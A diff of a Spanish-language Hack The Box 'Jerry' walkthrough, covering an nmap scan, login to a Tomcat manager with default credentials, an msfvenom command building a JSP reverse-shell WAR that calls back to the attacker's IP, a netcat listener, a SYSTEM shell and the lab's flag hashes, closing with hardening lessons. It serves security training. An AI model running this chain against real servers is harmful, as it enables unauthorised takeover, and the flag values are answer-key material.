@@ -1,21 +1,13 @@
-# HTB Jerry - Write-up
-
-![Hack The Box](https://img.shields.io/badge/HackTheBox-Jerry-yellow?style=for-the-badge)
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
-![OS](https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge)
-
 Objetivo:
+
 Comprometer un servidor Windows ejecutando Apache Tomcat mediante el despliegue de un archivo WAR malicioso para obtener privilegios de Administrador.
 
----
-
-1. Enumeración & Reconocimiento
+Enumeración & Reconocimiento
 
 El escaneo de puertos inicial con `nmap` reveló un servicio web activo en el puerto 8080.
 
-```bash
 nmap -sC -sV -Pn 10.129.136.9
-``` 
+
 Hallazgos clave:
 
 Servicio: Apache Tomcat/Coyote JSP engine 1.1
@@ -24,8 +16,10 @@ Versión: 7.0.88
 
 Panel de control: Localizado en /manager/html
 
-2. Explotación
-Acceso al Panel de Gestión
+Explotación
+
+Acceso al Panel de Gestión:
+
 Se intentó el acceso al panel /manager/html utilizando credenciales comunes/por defecto.
 
 Usuario: tomcat
@@ -34,11 +28,13 @@ Password: s3cret
 
 Resultado: Acceso exitoso con privilegios de administrador de aplicaciones.
 
-Generación del Payload
+Generación del Payload:
+
 Utilizando msfvenom, se generó un archivo .war con una reverse shell en JSP configurada para conectar a mi IP de la VPN:
 
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.204 LPORT=4444 -f war -o shell.war
 Ejecución
+
 Se realizó el Undeploy de la versión anterior en el Tomcat Manager.
 
 Se subió el nuevo archivo shell.war mediante la opción Deploy.
@@ -47,12 +43,13 @@ Se preparó el listener de Netcat: nc -lvnp 4444.
 
 Se activó el payload navegando a: http://10.129.136.9:8080/shell/.
 
-3. Post-Explotación
+Post-Explotación
 Tras recibir la conexión en Netcat, se verificó el nivel de privilegios en el sistema:
 
 C:\apache-tomcat-7.0.88> whoami
 nt authority\system
 Flags Capturadas
+
 Ambas flags (User y Root) se encuentran en el mismo directorio del Administrador:
 
 Ruta: C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
@@ -61,7 +58,8 @@ User Hash: 7004dbcef0f854e0fb401875f26ebd00
 
 Root Hash: 04a8b36e1545a455393d067e772fe90e
 
-Lecciones Aprendidas
+Lecciones Aprendidas:
+
 Hardening: Nunca permitir el acceso a paneles de gestión con credenciales por defecto.
 
 Privilegios: Los servicios web deben ejecutarse con cuentas de servicio limitadas, no como SYSTEM.
